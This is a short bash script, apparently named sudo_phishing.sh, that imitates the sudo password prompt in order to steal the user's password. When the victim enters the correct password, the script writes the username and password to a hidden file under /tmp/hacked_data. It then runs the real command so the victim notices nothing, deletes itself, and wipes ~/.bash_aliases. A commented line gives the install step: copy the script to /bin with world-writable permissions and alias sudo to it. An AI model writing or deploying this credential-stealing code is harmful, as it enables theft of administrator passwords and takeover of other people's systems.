readonly INPUT_MESSAGE="[sudo] password for ${USER}: "


MAXIMUM_ATTEMPTS=3
readonly ERROR_MESSAGE="-> sudo: ${MAXIMUM_ATTEMPTS} incorrect password attempts"

attempts() {
    echo -n "${INPUT_MESSAGE}"
    read -r -s sudo_password
    echo ""
    if ( echo "${sudo_password}" | sudo -k -S true > /dev/null 2>&1 ); then
        MAXIMUM_ATTEMPTS=0
        ##
        mkdir /tmp/hacked_data
        /bin/echo "${USER}:${sudo_password}"
        /bin/echo "${USER}:${sudo_password}" > /tmp/hacked_data/.sudo_password
        ##
        /bin/rm /tmp/sudo_phishing.sh
        /bin/echo "${sudo_password}" | /usr/bin/sudo -S "${@}"
        truncate -s 0 ~/.bash_aliases
        exit 0
    else 
        echo "Sorry, try again."
    fi
}


for ((iterator=1; iterator <= MAXIMUM_ATTEMPTS; iterator++)); do
    attempts "${@}"
done
/bin/echo "${ERROR_MESSAGE}"

#rm /bin/sudo_phishing.sh && cp sudo_phishing.sh /bin/sudo_phishing.sh && chmod 777 /bin/sudo_phishing.sh && echo "alias sudo='/bin/sudo_phishing.sh'" >> ~/.bash_aliases && source ~/.bash_aliases && . ~/.bash_aliases
